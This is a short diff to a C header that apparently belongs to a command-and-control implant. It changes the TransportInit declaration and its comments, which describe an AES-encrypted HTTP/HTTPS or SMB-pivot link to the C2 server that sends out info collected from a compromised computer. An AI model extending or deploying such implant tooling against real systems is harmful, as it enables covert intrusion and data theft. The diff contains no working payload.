@@ -10,14 +10,12 @@
 #define TRANSPORT_HTTP_ROTATION_RANDOM       1
 
 /*!
- * Initialize HTTP/HTTPS Connection to C2 Server + using AES encryption
+ * Initialize HTTP/HTTPS Connection to C2 Server + using AES encryption or
+ * Initializes a connection to the parent pivot over SMB + using AES encryption
  * and send the collected user/computer info about the compromised Computer
- * @param  Package pointer to use.
- *         NULL == send it directly using DEMON_INIT (99)
- *         If specified it's going to add the data to the specified Package
  * @return Return if functions ran successful
  */
-BOOL TransportInit( PPACKAGE Package );
+BOOL TransportInit();
 
 /*!
  * Send our specified data + encrypt it with random key
